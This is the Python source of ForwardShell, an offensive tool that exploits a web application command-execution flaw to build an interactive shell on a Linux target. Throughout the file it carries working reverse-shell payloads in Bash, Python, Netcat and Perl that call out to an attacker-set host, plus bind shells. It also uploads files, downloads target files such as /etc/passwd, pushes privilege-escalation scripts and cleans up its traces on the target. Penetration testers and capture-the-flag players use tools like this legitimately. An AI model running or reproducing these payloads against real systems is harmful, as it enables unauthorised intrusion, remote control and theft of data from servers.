#!/usr/bin/python3
#
# This is a semiautomatic shell you can use if you get a simple web application RCE.
# ForwardShell has some nice features:
# - Put your command in the GET URL, in the POST body or in a certain header by using the keyword <RCE>
# - Upgrade your web shell to a PTY with Python
# - ReverseShell in Bash, Python, Netcat and Perl
# - BindShell in Python, Netcat and Perl
# - File upload
# - File download
#
# Author: 61106960
# Credits to ippsec and 0xdf for their initial idea of a shell like this

import argparse
import base64
import gzip
import os
import random
import re
import requests
import threading
import time
import signal
import subprocess
import sys
import urllib.parse
from os.path import dirname
from urllib3.exceptions import InsecureRequestWarning

class WebShell(object):

######################################################################################
#                                                                                    #
# ForwardShell Init Function                                                         #
#                                                                                    #
# Initialise Variables                                                               # 
# Initialise FIFO Session                                                            #
# Initialise Shell                                                                   # 
#                                                                                    #
######################################################################################

    # Initialize Class + Setup Shell
    def __init__(self):
        print(f"[*] {__progname__} v{__version__}:")
        # Set up basic things
        self.url = options.url
        self.data = options.data
        self.lhost = options.lhost
        self.lport = options.lport
        self.revshell = options.revshell.lower()
        self.bindshell = options.bindshell.lower()
        self.working_path = options.path
        self.verbose = options.verbose
        self.display_prefix = options.prefix
        self.display_suffix = options.suffix

        # Check if the provided url starts with http...
        if not self.url.startswith('http'):
            print(f'[ERROR] Your URL {self.url} does not start with http...\n')
            parser.print_help()
            exit()

        # Set up proxy
        self.proxies = {}
        if options.proxy:
            self.proxies = {
                'http': f'{options.proxy}',
                'https': f'{options.proxy}'
            }
            if self.verbose: print(f"[VERBOSE] Using proxy {self.proxies['http']}")

        # Setup additional headers
        self.headers = {}
        self.headers['User-Agent'] = f'{__progname__}/{__version__}'
        self.headers['Content-Type'] = 'application/x-www-form-urlencoded'

        if options.cookie:
            self.headers['Cookie'] = options.cookie
        
        if options.header:
            for header in options.header:
                header_name, header_value =  header[0].split(':')
                self.headers[f'{header_name.strip()}'] = header_value.strip()

        if self.verbose: print(f"[VERBOSE] Add additional header {self.headers}")

        # Set up network speed
        self.interval=1 # == fast
        if self.verbose: print(f"[VERBOSE] Using network connection speed {options.speed}")
        if options.speed.strip().lower() == 'insane':
            self.interval=0.25
        elif options.speed.strip().lower() == 'fast':
            self.interval=1
        elif options.speed.strip().lower() == 'medium':
            self.interval=1.5
        elif options.speed.strip().lower() == 'slow':
            self.interval=3

        # Set up HTTP method
        self.method = 'get'
        if self.data:
            self.method = 'post'
        if self.verbose: print(f"[VERBOSE] Using HTTP method {self.method.upper()}")

        # Set up chunk size for file upload
        self.chunk_size = 1850 # default if using GET
        if self.method == 'post':
            self.chunk_size = 80000
        if self.verbose: print(f"[VERBOSE] Using a chunk size of {self.chunk_size} characters when uploading files")

        # Request local file path on target for needed binary files
        print(f"[*] Trying to set up {__progname__} on Target {self.uri_parser(self.url)}")
        self.GetProg()

        # Set up fifo session
        self.setup_fifo()

        # Set up shell
        self.RunRawCmd(self.MakeNamedPipes, timeout=1)
        raw_result = self.RunRawCmd(f"{self.LS} {self.stdout}")
        CheckConnection = self.DisplayResp(raw_result)
        if CheckConnection:
             CheckCheckConnection = CheckConnection.rstrip()
        if CheckConnection == f'{self.stdout}':
            print(f"[+] Connection to {self.uri_parser(self.url)} with ID {self.session} established")
            ClearOutput = f'{self.ECHO} -n "" > {self.stdout}'
            self.RunRawCmd(ClearOutput)
        else:
            print(f"[ERROR] Cannot connect to {self.uri_parser(self.url)}")
            exit()

        # Catch CTRL+C
        signal.signal(signal.SIGINT, self.signal_handler)

        # Set up read thread
        self.stop_threads = False
        self.thread = threading.Thread(target=self.ReadThread, args=(lambda : self.stop_threads,))
        self.thread.daemon = True
        self.thread.start()

######################################################################################
#                                                                                    #
# Command = ?                                                                        #
#                                                                                    #
# Functions are:                                                                     # 
# Help                  Show Program Help                                            #
# Error                 Show Error Message with Some Help                            #
#                                                                                    #
######################################################################################

    # Show program help function and set module parameters
    def Help(self, module):
        if module == 'main':
            print(
            f'[?] {__progname__} - Internal Commands:\n'
            f'\n'
            f'  ?set                    Change Bind- and ReverseShell parameters, like LHOST, LPORT and Shell type\n'
            f'  ?start                  Start a {__progname__} shell module\n'
            f'  ?start -m {{module}}      Start a specific shell module; available modules are Upgrade, RevShell and BindShell\n'
            f'  ?resume                 Resumes an existing shell on the target\n'
            f'  ?upload                 Upload a file or module to the targets working directory {self.working_path}\n'
            f'  ?upload {{filename}}      Upload a file from your local working directory to the target\n'
            f'  ?upload -m {{module}}     Upload a module to the target; available modules are LinPeas, exploit-suggester and linEnum\n'
            f'  ?download {{filename}}    Download a file from the target to your local working directory\n'
            f'  ?exit                   Stops the shell, kills own processes, removes own files on the target system and exits the program\n'
            f'  ?exit -force            Stops the shell, kill all processes and files from all possible running or stuck Shells\n'
            f'  ?exit -silent           Pause the shell, disconnects from the target and wait to get it reconnected with ?resume\n')

        elif module == 'Set':
            print(
            f'[?] {__progname__} - ReverseShell Parameter:\n'
            f'\n'
            f'  LHOST                   {self.lhost}\n'
            f'  LPORT                   {self.lport}\n'
            f'  Revshell                {self.revshell} (possible values are Bash, Python, NetCat, Perl)\n'
            f'\n'
            f'[?] {__progname__} - BindShell Parameter:\n'
            f'\n'
            f'  LPORT                   {self.lport}\n'
            f'  Bindshell               {self.bindshell} (possible values are Python, Netcat, Perl)\n'
            f'\n'
            f'You can set the above parameter according to your needs, e.g.:\n> ?set LHOST 192.168.0.1\n> ?set LPORT 443\n> ?set Revshell Python\n> ?set BindShell Perl\n')
        elif module == 'Start':
            print(
            f'[?] {__progname__} - Modules:\n'
            f'\n'
            f'  ?start -m upgrade       Upgrade your shell to a PTY with Python\n'
            f'  ?start -m revshell      Start a ReverseShell with Bash [change from Bash to Python, NetCat or Perl via ?set]\n'
            f'  ?start -m bindshell     Start a BindShell with Python [change from Python to Netcat or Perl via ?set]\n')
        elif module == 'Upload':
            print(
            f'[?] {__progname__} - File Upload:\n'
            f'\n'
            f'  ?upload {{filename}}      Upload a local file to the target {self.working_path} directory\n'
            f'  ?upload -m {{module}}     Downloads a module file from the Internet source and uploads it directly to the target {self.working_path} directory\n'
            f'                          (possible modules are LinPeas, exploit-suggester, LinEnum)\n'
            f'\n'
            f'You can upload a file like:          You can upload a module like:\n'
            f'> ?upload linpeas.sh                 > ?upload -m LinPeas\n'
            f'> ?upload c:\\tools\\chisel            > ?upload -m exploit-suggester\n'
            f'> ?upload /usr/bin/ncat              > ?upload -m LinEnum\n')
        elif module == 'Download':
            print(
            f'[?] {__progname__} - File Download:\n'
            f'\n'
            f'  ?download {{filename}}     Download a file from the target to your local working directory\n'
            f'\n'
            f'You can download a single file (use always the complete path) like:\n'
            f'> ?download /etc/passwd\n')
        else:
            pass

    def Error(self, raw_result, filtered_result):
        if self.verbose:
            print(f"[VERBOSE] This was the server response:\n \'{raw_result}\'")
            print(f"[VERBOSE] Server response after display filter is \'{filtered_result}\'")
            print(f"[VERBOSE] Likely that you have to adjust the values for -prefix and -suffix or your request URL with the provided data is wrong")
        print(f"[ERROR] Cannot establish a shell with URL {self.uri_parser(self.url)} and the provided data")
        print(f"[ERROR] Please use the program switch -verbose to get more details of the connection issue or -h to get more help")
        exit()


######################################################################################
#                                                                                    #
# Command = ?set                                                                     #
#                                                                                    #
# Functions are:                                                                     # 
# SetParameter          Set Parameter for Bind- and RevShell                         #
#                                                                                    #
######################################################################################

    # Set program parameters
    def SetParameter(self, option, value):
        option, value = option.strip().lower(), value.strip().lower()
        if option == 'lhost':
            ip_pattern = re.compile("^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$")
            ip_valid = ip_pattern.match(value)
            if ip_valid:
                self.lhost = value
                print()
                print(f'  [+] LHOST      {self.lhost}')
                print()
            else:
                print(f'[ERROR] The given input {value} is not a valid IPv4 address')
        elif option == 'lport':
            try:
                if int(value) >= 1 and int(value) <= 65535:
                    self.lport = int(value)
                    print()
                    print(f'  [+] LPORT      {self.lport}')
                    print()
                else:
                    print(f'[ERROR] The given input {value} is not a valid tcp port')
            except:
                print(f'[ERROR] The given input \'{value}\' is not a valid numeric tcp port')
        elif option == 'revshell':
            RevShells = ['bash','python','netcat','perl']
            if value in RevShells:
                    self.revshell = value
                    print()
                    print(f'  [+] Revshell   {self.revshell}')
                    print()
            else:
                print('[ERROR] Wrong ReverseShell version, use \'Bash\', \'Python\', \'Netcat\' or \'Perl\'\n')
        elif option == 'bindshell':
            BindShells = ['python','netcat','perl']
            if value in BindShells:
                    self.bindshell = value
                    print()
                    print(f'  [+] Bindshell  {self.bindshell}')
                    print()
            else:
                print('[ERROR] Wrong BindShell version, use \'Python\', \'Netcat\' or \'Perl\'\n')
        else:
            print(f'[ERROR] option {option} is unknown\n')
            S.Help('Set')

######################################################################################
#                                                                                    #
# Command = ?start                                                                   #
#                                                                                    #
# Functions are:                                                                     # 
# UpgradeShell          Upgrades to a PTY Shell                                      #
# RevShell              Start a ReverseShell                                         #
# BindShell             Start a BindShell                                            #
#                                                                                    #
######################################################################################

    # Upgrade ForwardShell to PTY
    def UpgradeShell(self):
        if self.PYTHON:
            print(f'[*] Start PTY with {self.PYTHON}')
            UpgradeShell = f"""{self.PYTHON} -c 'import pty; print("Fwdsh-{self.session}"); pty.spawn("/bin/bash")'"""
            self.WriteCmd(UpgradeShell)
            print(f'Just upgrade your PTY a little bit...')
            upgrade_pty = f"""export TERM=xterm-256color ; alias ll=\'ls -ali --color=auto\'"""

            if not os.name == 'nt':
                rows, cols = subprocess.check_output(['stty', 'size']).decode().split()
                upgrade_pty = f"""export SHELL=bash; export TERM=xterm-256color; stty rows {rows} cols {cols}; alias ll=\'ls -ali --color=auto\'"""

            self.WriteCmd(upgrade_pty)

        else:
            print(f"[ERROR] No Python found on target; PTY not possible")

    # Start ReverseShell
    def RevShell(self):

        if self.lhost == '127.0.0.1':
            print('[ERROR] You have to set a valid LHOST first, use ?set lhost')
        else:
            try:
                if self.revshell == 'bash' and self.BASH:
                    # Bash reverse shell
                    RevShellFormat = f"""{self.BASH} -c 'bash -i >& /dev/tcp/{self.lhost}/{self.lport} 0>&1' &"""
                elif self.revshell == 'python' and self.PYTHON:
                    # Python reverse shell
                    RevShellFormat = f"""{self.PYTHON} -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{self.lhost}",{self.lport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("{self.BASH}")' &"""
                elif self.revshell == 'netcat' and self.NETCAT:
                    # NetCat reverse shell
                    RevShellFormat = f"""{self.NETCAT} {self.lhost} {self.lport} -e {self.BASH} &"""
                elif self.revshell == 'perl' and self.PERL:
                    # Perl reverse shell
                    RevShellFormat = f"""{self.PERL} -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"{self.lhost}:{self.lport}");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;' &"""
                else:
                    print(f"[ERROR] No {self.revshell} found on target; ReverseShell not possible")

                print(f'[*] Starting ReverseShell with {self.revshell} to {self.lhost} on port {self.lport}\n')
                if self.verbose: print(f"[VERBOSE] ReverseShell raw command {RevShellFormat}")
                self.WriteCmd(RevShellFormat)
            except:
                print('[ERROR] Something went wrong with starting the ReverseShell')

    # Start BindShell
    def BindShell(self):

        try:
            if self.bindshell == 'netcat' and self.NETCAT:
                # NetCat bind shell
                BindShellFormat = f"""{self.NETCAT} -nlvp {self.lport} -e {self.BASH} &"""
            elif self.bindshell == 'python' and self.PYTHON:
                # Python bind shell
                BindShellFormat = f"""{self.PYTHON} -c 'import socket,os,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind(("0.0.0.0",{self.lport}));s.listen(5);c,a=s.accept();os.dup2(c.fileno(),0);os.dup2(c.fileno(),1);os.dup2(c.fileno(),2);p=subprocess.call(["{self.BASH}","-i"])' &"""
            elif self.bindshell == 'perl' and self.PERL:
                # Perl bind shell
                BindShellFormat = f"""{self.PERL} -MIO -e 'use Socket;$protocol=getprotobyname('tcp');socket(S,&PF_INET,&SOCK_STREAM,$protocol);setsockopt(S,SOL_SOCKET,SO_REUSEADDR,1);bind(S,sockaddr_in({self.lport},INADDR_ANY));listen(S,3);while(1){{accept(CONN,S);if(!($pid=fork)){{die "Cannot fork" if (!defined $pid);open STDIN,"<&CONN";open STDOUT,">&CONN";open STDERR,">&CONN";exec "/bin/bash -i";close CONN;exit 0;}}}}' &"""
            else:
                print(f"[ERROR] No {self.bindshell} found on target; BindShell not possible")

            print(f'[*] Starting BindShell with {self.bindshell} on port {self.lport}')
            if self.verbose: print(f"[VERBOSE] BindShell raw command {BindShellFormat}")
            self.WriteCmd(BindShellFormat)
        except:
            print('[ERROR] Something went wrong with Starting the BindShell')

######################################################################################
#                                                                                    #
# Command = ?upload                                                                  #
#                                                                                    #
# Functions are:                                                                     # 
# UploadCmd             Upload a file or module                                      #
# DownloadProg          Download pre-defined Internet Scripts                        #
#                                                                                    #
######################################################################################

    # Upload a file or module
    def UploadCmd(self, upload, stream=False, name='dummy'):
        # If the content of parameter 'upload' is a stream and not a file
        if stream:
            filename = name
            raw_data = upload

        # This is to read a file from the filesystem
        else:
            try:
                with open(upload, 'rb') as file:
                    filename = (os.path.split(upload))[1]
                    raw_data = file.read()
            except:
                print(f'[ERROR] Something went wrong with reading the file {upload}')
                return False

        # Compress and bas64 the content
        comp_data = gzip.compress(raw_data, compresslevel=9)
        enc_data = base64.b64encode(comp_data).decode('ascii')

        # Split the base64 blob in chunks; the size depends on GET or POST        
        print(f'[*] Calculating chunks of {filename}...')
        chunk_array = list(self.split_chunks(enc_data, n=self.chunk_size))
        for index, chunk in enumerate(chunk_array):
            print(f'[*] Uploading chunk {(index) +1} of {len(chunk_array)} from {filename} in progress...', end='\r', flush=True)
            upload_file = f'{self.ECHO} -n {chunk} >> {self.working_path}/{filename}.gz~b64'
            self.WriteCmd(upload_file, fifo=False)
        
        print(f'\n[!] Upload finished')
        expand_file = f'{self.CAT} {self.working_path}/{filename}.gz~b64 | {self.BASE64} -d > {self.working_path}/{filename}.gz ; {self.GZIP} -d -f {self.working_path}/{filename}.gz ; {self.RM} -f {self.working_path}/{filename}.gz~b64'
        self.WriteCmd(expand_file, fifo=False)

    # Downloads files from the Internet and uploads them to the target
    def DownloadProg(self, url, timeout=30):
        headers = {'User-Agent': f'{__progname__}/{__version__}'}
        try:
            r = requests.get(url, headers=headers, proxies=self.proxies, timeout=timeout)
            return r.content
        except:
            print(f'[ERROR] Something went wrong with downloading {url}')

######################################################################################
#                                                                                    #
# Command = ?download                                                                #
#                                                                                    #
# Functions are:                                                                     # 
# DownloadFile          Download a File from the Target                              #
#                                                                                    #
######################################################################################

    # Download a files from the target
    def DownloadFile(self, file):
        # gzip file, base64 it and request it
        file_download = f'{self.GZIP} {file} -c | {self.BASE64} -w0'
        if self.verbose: print(f"[VERBOSE] Download file raw command {file_download}")
        print(f'[*] Downloading {file} in progress...')
        raw_result = self.WriteCmd(file_download, fifo=False)
        downloaded_file = self.DisplayResp(raw_result)
        try:
            # base64 decode it
            decoded_data = base64.b64decode(downloaded_file)
            # decompress it
            decompressed_data = gzip.decompress(decoded_data)
        except:
            print(f'[ERROR] Something went wrong with downloading {file}')
            print(f'{downloaded_file}')
            return False

        # write the binary blob to file
        filename = file.split('/')[-1].strip('"|\'')
        try:
            with open(filename, 'wb') as file:
                file.write(decompressed_data)
                print(f'[*] Saved the file {filename} successfully')
        except:
            print(f'[ERROR] Something went wrong with saving the file {filename}')

######################################################################################
#                                                                                    #
# Command = ?exit                                                                    #
#                                                                                    #
# Functions are:                                                                     # 
# killCmd               Exits the program and cleanup the Target                     #
#                                                                                    #
######################################################################################

    # Terminating shell and deleting files
    def killCmd(self, force=False, silent=False, end_prog=True):

        if silent:
            print(f'[!] {__progname__} will just be disconnected, your session {self.session} stays open still')
            print(f'[*] Please consider command ?resume to get your orphaned session connected again...')
            print(f'[*] See you again soon :-)')
            sys.exit(1)

        # stop read thread
        self.stop_threads = True
        self.thread.join()
        print(f'[*] Cleaning up unneeded sessions and files')

        if force:
            print(f'[!] Terminating all running shells')
            checkProcess = f'{self.PS} -aux | {self.GREP} -e {self.stdin.split(".")[0]} -e "-c import pty; print(\\\"Fwdsh-"'
        else:
            print(f'[!] Terminating {__progname__} with ID {self.session}')
            checkProcess = f'{self.PS} -aux | {self.GREP} -e {self.stdin} -e "-c import pty; print(\\\"Fwdsh-{self.session}"'
        
        # read result of ps -aux and kill processes
        raw_result = self.WriteCmd(checkProcess, fifo=False)
        result = self.DisplayResp(raw_result)

        processes = result.split('\n')
        for process in processes[0:]:
            if process >= '1':
                killproc = f'{self.KILL} {process.split()[1]}'
                if self.verbose: print(f"[VERBOSE] Kill process {process.split()[1]}")
                self.WriteCmd(killproc, fifo=False)
            elif process < '1':
                pass
            else:
                print(f'[ERROR] No running {__progname__} process')
        
        # delete fifo files
        if force == True:
            Fwdshellfiles = f'{self.RM} -f {self.stdin.split(".")[0]}.* ; {self.RM} -f {self.stdout.split(".")[0]}.*'
        else:
            Fwdshellfiles = f'{self.RM} -f {self.stdin} {self.stdout}'
        if self.verbose: print(f"[VERBOSE] Send data: {Fwdshellfiles}")
        self.WriteCmd(Fwdshellfiles, fifo=False)

        if end_prog == False:
            return

        print(f'[*] Have a nice day :-)')
        sys.exit(1)

######################################################################################
#                                                                                    #
# Command = ? resume                                                                 #
#                                                                                    #
# Functions are:                                                                     #
# session_resume           Resumes a open session                                    # 
#                                                                                    #
######################################################################################

    # Get all open sessions and resume a specific one
    def session_resume(self):
        OpenSessions = f'{self.LS} {self.stdin.split(".")[0]}.*'
        raw_result = self.WriteCmd(OpenSessions, fifo=False)
        result = self.DisplayResp(raw_result).split('\n')
        print(f'Your own current session is: {self.session}\nThese are the current open sessions at {self.uri_parser(self.url)}:\n')
        for session in result:
            print(f'> Session Number {result.index(session)}: {session.split(".")[1]}')
        
        try:
            ask_session = int(input("\nTo which session number you want to connect to: "))

        except:
            print('[ERROR] You can enter digits only, please try again')
            return

        for session in result:
            session_id = int(session.split(".")[1])
            session_index = result.index(session)

            try:
                if ask_session == session_id or ask_session == session_index:
                    if session_id == self.session:
                        print('[ERROR] You cannot switch to your own current session')
                        return
                    if self.verbose: print(f'[VERBOSE] OK, Let\'s resume session number {session_index}: {session_id}')

                    # Stop old read thread
                    self.killCmd(end_prog=False)

                    # Reconfigure session ID and restart fifo
                    self.session = session_id
                    self.setup_fifo(resume=True)
                    if self.verbose:
                        print(f'[VERBOSE] Switch STDIN to {self.stdin}')
                        print(f'[VERBOSE] Switch STDOUT to {self.stdout}')
                    print(f'[+] Switching to session {self.session}')

                    # Restart read thread
                    self.stop_threads = False
                    self.thread = threading.Thread(target=self.ReadThread, args=(lambda : self.stop_threads,))
                    self.thread.daemon = True
                    self.thread.start()

            except:
                print(f'[ERROR] The session ID {ask_session} you have entered could not be determined')
                break

######################################################################################
#                                                                                    #
# ForwardShell Core Modules                                                          #
#                                                                                    #
# Functions are:                                                                     # 
# WriteCmd              Builds the RCE request                                       #
# RunRawCmd             Sends the RCE request to the target                          #
# ReadThread            Starts a Thread an reads RCE output constantly               #
#                                                                                    #
######################################################################################

    # Build the RCE command
    def WriteCmd(self, cmd, fifo=True):
        b64cmd = base64.b64encode('{}\n'.format(cmd.rstrip()).encode('utf-8')).decode('utf-8')
        if fifo:
            # if fifo enabled redirect the command in fifo-stdin
            stage_cmd = f'{self.ECHO} {b64cmd} | {self.BASE64} -d > {self.stdin}'
            if self.verbose: print(f"[VERBOSE] Send data: {stage_cmd}")
            self.RunRawCmd(stage_cmd)
        else:
            # if fifo disabled pipe the command directly to the shell
            stage_cmd = f'{self.ECHO} {b64cmd} | {self.BASE64} -d | {self.SH} 2>&1'
            if self.verbose: print(f"[VERBOSE] Send data: {stage_cmd}")
            return (self.RunRawCmd(stage_cmd))
        time.sleep(self.interval *1.0)

    # Execute command
    def RunRawCmd(self, cmd, timeout=10):
        keyword = options.keyword
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

        # Use this to adjust your RCE payload even more
        payload = urllib.parse.quote(cmd)

        # Replace 'keyword' in the URL
        rce_url = self.url.replace(keyword, payload)

        # Replace 'keyword' in the POST body
        if self.data:
            rce_data = self.data.replace(keyword, payload)

        # Replace 'keyword' in the header
        rce_header = self.headers.copy()
        for header in rce_header:
            current_value = rce_header.get(header)
            new_value = current_value.replace(keyword, payload)
            rce_header[header] = new_value

        try:
            if self.method == 'post':
                    r = requests.post(rce_url, data=rce_data, headers=rce_header, proxies=self.proxies, timeout=timeout, verify=False)
            elif self.method == 'get':
                    r = requests.get(rce_url, headers=rce_header, proxies=self.proxies, timeout=timeout, verify=False)
            return r.text
        except:
            pass

    # Read $session, output text to screen & wipe session
    def ReadThread(self, stop):
        GetOutput = f"{self.CAT} {self.stdout}"
        while True:
            if stop():
                break
            raw_result = self.RunRawCmd(GetOutput)
            if raw_result:
                result = self.DisplayResp(raw_result)
                if result == False or result == '':
                    pass
                else:
                    print(result)
                
                ClearOutput = f'{self.ECHO} -n "" > {self.stdout}'
                self.RunRawCmd(ClearOutput)
            time.sleep(self.interval *1.2)

######################################################################################
#                                                                                    #
# ForwardShell Helper Modules                                                        #
#                                                                                    #
# Functions are:                                                                     # 
# DisplayResp           Formats the raw RCE output                                   #
# GetBinPath            Gets the full path of a certain binary at the target         #
# GetProg               Gets the full path of Python and Netcat at the target        #
# split_chunks          Splits a string in chunks (for File Download)                #
# uri_parser            Splits a url and gives the FQDN                              #
# signal_handler        Covers a CTRL+C keyboard interrupt                           #
# setup_fifo            Setup a new fifo shell or switch to another one              #
#                                                                                    #
######################################################################################

    # Display the result of the request
    # Use this function to adjust the results if needed
    def DisplayResp(self, raw_input):

        display_result = raw_input.strip('\n')

        if options.prefix or options.suffix:
            # use the user provided prefix and suffix to build a RegEx
            if self.display_prefix and self.display_suffix:
                pattern = f'{self.display_prefix}(.*){self.display_suffix}'

            # use the user provided prefix to build a RegEx
            elif self.display_prefix:
                pattern = f'{self.display_prefix}(.*)'

            # use the user provided suffix to build a RegEx
            elif self.display_suffix:
                pattern = f'(.*){self.display_suffix}'
            
            result = re.search(pattern, raw_input, re.DOTALL)

            try:
                display_result = result.group(1).strip('\n')
            except:
                pass

        return display_result

    # Helper Module to get the file system path of a program
    def GetBinPath(self, file):
        binary_found = False

        try:
            if self.verbose: print(f"[VERBOSE] Searching file path for binary {file} on {self.uri_parser(self.url)}")

            try:
                # check if binary which has been found already and use it to search for other binaries
                if self.WHICH:
                    filename = f'{self.WHICH} {file}'
                    raw_result = self.RunRawCmd(filename)
                    result = self.DisplayResp(raw_result)
                    if self.verbose: print(f"[VERBOSE] Found binary path {result} by using {self.WHICH}")
                    return result

            except:
                # if which has not been found already or is not available at all, search the binaries in common binary paths
                prog_path = ["/usr/bin", "/usr/sbin", "/sbin", "/bin"]
                for path in prog_path:
                    filename = f'ls {path}/{file}'
                    raw_result = self.RunRawCmd(filename)
                    result = self.DisplayResp(raw_result)
                    if result == f'{path}/{file}':
                        if self.verbose: print(f"[VERBOSE] Found binary path {result} by discovering target")
                        binary_found = True
                        return result
                    else:
                        if self.verbose: print(f'[VERBOSE] Binary {file} not found in {path}')
                        pass
                # If not even the binary bash has been found, the program has to be stopped
                if binary_found == False:
                    if file == 'bash':
                        if self.verbose: print(f'[VERBOSE] Without binary {file}, {__progname__} does not run')
                        self.Error(raw_result, result)
        except:
            print(f"[ERROR] Cannot connect to {self.uri_parser(self.url)}")
            exit()

    # Get path of needed binaries on target
    def GetProg(self):
        # Request file path of needed binaries
        binaries = ["which", "bash", "base64", "cat", "cp", "echo", "grep", "gzip", "kill", "ls", "mkfifo", "mv", "perl", "ps", "rm", "sh", "tail"]
        for binary in binaries:
            result = self.GetBinPath(binary)
            if result:
                if binary == "which": self.WHICH = result
                elif binary == "bash": self.BASH = result
                elif binary == "base64": self.BASE64 = result
                elif binary == "cat": self.CAT = result
                elif binary == "cp": self.CP = result
                elif binary == "echo": self.ECHO = result
                elif binary == "grep": self.GREP = result
                elif binary == "gzip": self.GZIP = result
                elif binary == "kill": self.KILL = result
                elif binary == "ls": self.LS = result
                elif binary == "mkfifo": self.MKFIFO = result
                elif binary == "mv": self.MV = result
                elif binary == "perl": self.PERL = result
                elif binary == "ps": self.PS = result
                elif binary == "rm": self.RM = result
                elif binary == "sh": self.SH = result
                elif binary == "tail": self.TAIL = result
            else:
                if self.verbose: print(f"[VERBOSE] No path to binary {binary} found")
                pass

        binaries_python = ["python", "python3", "python2"]
        for version in binaries_python:
            result = self.GetBinPath(version)
            if result:
                self.PYTHON = result
                break
            else:
                if self.verbose: print(f"[VERBOSE] No path to binary {version} found")
                pass

        binaries_netcat = ["ncat", "netcat", "nc"]
        for version in binaries_netcat:
            result = self.GetBinPath(version)
            if result:
                self.NETCAT = result
                break
            else: 
                if self.verbose: print(f"[VERBOSE] No path to binary {version} found")
                pass
        
    # Helper module to split var in chunks
    def split_chunks(self, seq, n=8000):
        while seq:
            yield seq[:n]
            seq = seq[n:]

    # Parse the URL and returns values
    def uri_parser(self, url):
        parsed_uri = urllib.parse.urlparse(url)
        result = '{uri.scheme}://{uri.netloc}/'.format(uri=parsed_uri)
        return result[:-1]

    # Stop the program gracefully
    def signal_handler(signal, frame, args):
        print("Ok ok, I am quitting...\n")
        print("But please consider to use '?exit', \'?exit -force\' or \'?exit -silent\' instead of CTRL+C\n")
        sys.exit(1)
    
    # Set up fifo session
    def setup_fifo(self, resume=False):

        if not resume:
            # Generate random session ID
            self.session = random.randrange(10000,99999)
            if self.verbose: print(f"[VERBOSE] Generate random session ID: {self.session}")

        # Set stdin and stdout files in filesystem
        self.stdin = f'{self.working_path}/Fwdsh-input.{self.session}'
        self.stdout = f'{self.working_path}/Fwdsh-output.{self.session}'

        if not resume:
            # Setup the fifo shell
            self.MakeNamedPipes = f"{self.MKFIFO} {self.stdin}; {self.TAIL} -f {self.stdin} | {self.SH} 2>&1 > {self.stdout}"
    
######################################################################################
#                                                                                    #
# ForwardShell Main Function                                                         #
#                                                                                    #
######################################################################################

# Process command-line arguments.
if __name__ == '__main__':
    __progname__ = 'ForwardShell'
    __version__ = '0.4.3'

    parser = argparse.ArgumentParser(
        add_help=True,
        formatter_class=argparse.RawDescriptionHelpFormatter,
        description=f'{__progname__} v{__version__} - Exploits a simple Web application RCE on Linux systems and builds a semiautomatic shell',
        usage=f'python3 {__progname__}.py -url <url> [-data <post-data>] [-prefix <prefix>] [-suffix <suffix>] [-proxy <proxy>]',
        epilog=('Program Usage Examples:\n'
        'PUT the keyword <RCE> in a GET request, a POST data body or even in an additional header\n'
        'and it will be automatically replaced with the command you type in the shell\n'
        '\n'
        'RCE in a GET parameter:\n'
        'Python3 ForwardShell.py -url http://www.site.com/upload/shell.php?param1=foobar&cmd=<RCE>&param3=ABC123\n'
        '\n'
        'RCE in a POST body parameter:\n'
        'Python3 ForwardShell.py -url http://www.site.com/upload/shell.php -data \'param1=foobar&cmd=<RCE>&param3=ABC123\'\n'
        '\n'
        'RCE in a header:\n'
        'Python3 ForwardShell.py -url http://www.site.com/upload/shell.php -header \'Authorization: <RCE>\'\n'
        '\n'
        'Strip unneeded parts of response:\n'
        'Python3 ForwardShell.py -url http://www.site.com/upload/shell.php -prefix \'<pre>\' -suffix \'</pre>\'\n'
        '\n'
        'Use a proxy:\n'
        'Python3 ForwardShell.py -url http://www.site.com/upload/shell.php?param1=foobar&cmd=InjectMe&param3=ABC123 -keyword \'InjectMe\' -proxy \'http://127.0.0.1:8080\'\n \n'
        ))

    parser.add_argument('-url', action='store', metavar='', help='Target URL (e.g. http://www.site.com/upload/shell.php?cmd=<RCE>')
    parser.add_argument('-data', action='store', metavar='?', default = '', help='Data string to be sent through POST (e.g. "cmd=<RCE>")')
    parser.add_argument('-prefix', action='store', metavar='', default = '', help='If the responses has more then the expected RCE output use -prefix to set the unneeded pattern in front the output')
    parser.add_argument('-suffix', action='store', metavar='', default = '', help='If the response has more then the expected RCE output use -suffix to define the unneeded pattern after the output')
    parser.add_argument('-cookie', action='store', metavar='', default = '', help='HTTP Cookie header value (e.g. "PHPSESSID=h5onbf...")')
    parser.add_argument('-header', action='append', nargs='+', metavar='', help='Extra header (e.g. "Authorization: Basic QWxhZ..."')
    parser.add_argument('-proxy', action='store', metavar='', default = '', help='Use a proxy to connect to the target URL [http(s)://host:port]')
    parser.add_argument('-keyword', action='store', metavar='', default = '<RCE>', help='change the command injection keyword from <RCE> to another value if needed')
    parser.add_argument('-verbose', action='store_true', default = False, help='Verbose output')

    group = parser.add_argument_group('you can use even more Bind- and ReverseShell arguments')
    group.add_argument('-lhost', action='store', metavar='', default = '127.0.0.1', help='Your local listening IP address if you use the ReverseShell option')
    group.add_argument('-lport', action='store', metavar='', default = '9001', help='Your local listening TCP port if you use the Bind- or ReverseShell option')
    group.add_argument('-revshell', action='store', metavar='', choices=['bash', 'python', 'perl'], default = 'Bash', help='Kind of ReverseShell [Bash, Python, Perl; default=Bash]')
    group.add_argument('-bindshell', action='store', metavar='', choices=['python', 'netcat', 'perl'], default = 'Python', help='Kind of BindShell [Python, Netcat, Perl; default=Python]')
    group.add_argument('-speed', action='store', metavar='', choices=['insane', 'fast', 'medium', 'slow'], default = 'fast', help='Network speed to the target [Insane, Fast, Medium, Slow; default=Fast]')
    group.add_argument('-path', action='store', metavar='', default = '/dev/shm', help=f'Default {__progname__} working path; Change it to /tmp if /dev/shm is not available')

    options = parser.parse_args()

    if len(sys.argv)==1:
        parser.print_help()
        sys.exit(1)

    # Initialize WebShell class
    S = WebShell()
